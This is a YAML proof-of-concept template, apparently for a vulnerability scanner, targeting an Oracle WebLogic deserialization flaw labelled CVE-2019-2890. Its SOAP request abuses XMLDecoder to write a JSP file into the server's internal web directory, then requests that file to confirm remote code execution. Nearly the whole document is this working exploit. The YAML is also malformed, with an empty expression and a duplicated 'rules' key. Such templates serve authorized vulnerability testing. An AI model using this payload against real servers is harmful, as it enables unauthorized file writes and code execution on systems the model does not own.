pocs/weblogic-cve-2019-2890.yml

name: poc-yaml-weblogic-cve-2019-2890
rules:
  - method: POST
    path: /_async/AsyncResponseService
    headers:
      Content-Type: text/xml
    body: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string><void method="println"><string><![CDATA[ <% out.print("6512bd43d9caa6e02c990b0a82652dca");%>]]></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
    follow_redirects: true
    expression: |
rules:
  - method: GET
    path: /bea_wls_internal/test.jsp
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"6512bd43d9caa6e02c990b0a82652dca")
detail:
  author: amos
  links:
    - https://blog.csdn.net/Adminxe/article/details/105926968
